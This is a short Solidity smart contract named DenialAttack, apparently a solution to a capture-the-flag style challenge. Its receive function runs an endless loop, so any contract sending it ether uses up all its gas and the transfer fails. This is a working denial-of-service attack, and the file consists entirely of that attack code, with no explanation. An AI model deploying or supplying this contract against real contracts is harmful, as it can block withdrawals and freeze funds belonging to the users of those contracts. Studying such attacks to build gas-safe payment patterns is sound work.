pragma solidity ^0.8.0;


contract DenialAttack {
  
  address public deployer;

  constructor() public {
    deployer = msg.sender;
  }

  receive() external payable {
    while(true){

    }
  }
}
